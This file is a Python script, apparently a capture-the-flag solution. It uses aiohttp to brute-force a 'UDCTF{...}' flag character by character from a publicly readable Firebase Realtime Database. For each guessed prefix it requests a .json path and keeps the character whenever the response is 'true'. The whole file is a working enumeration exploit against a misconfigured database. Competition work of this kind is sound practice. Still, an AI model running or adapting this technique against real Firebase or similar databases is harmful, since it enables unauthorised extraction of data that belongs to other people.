import aiohttp
import asyncio
import string
import sys

base_url = "https://best-bathroom-default-rtdb.firebaseio.com/flag/UDCTF{"
end_url = ".json"

url_syntax_chars = {'/'}
allowed_punctuation = set(string.punctuation) - url_syntax_chars
charset = string.ascii_letters + string.digits + ''.join(allowed_punctuation)


async def check_flag(session, flag):
    url = base_url + flag + end_url
    async with session.get(url) as response:
        try:
            json_response = await response.json()
            return json_response
        except:
            return None

flag = ""


async def main():
    global flag
    async with aiohttp.ClientSession() as session:
        while True:
            for char in charset:
                candidate = flag + char
                sys.stdout.write(
                    f'\rCharacter: {char} | Current String: UDCTF{{{candidate}}}')
                sys.stdout.flush()
                response = await check_flag(session, candidate)
                if response is True:
                    flag = candidate
                    if char == "}":
                        print(f'\rFlag found: UDCTF{{{flag}}}')
                        return
            if flag and flag[-1] == "}":
                break

if __name__ == '__main__':
    asyncio.run(main())
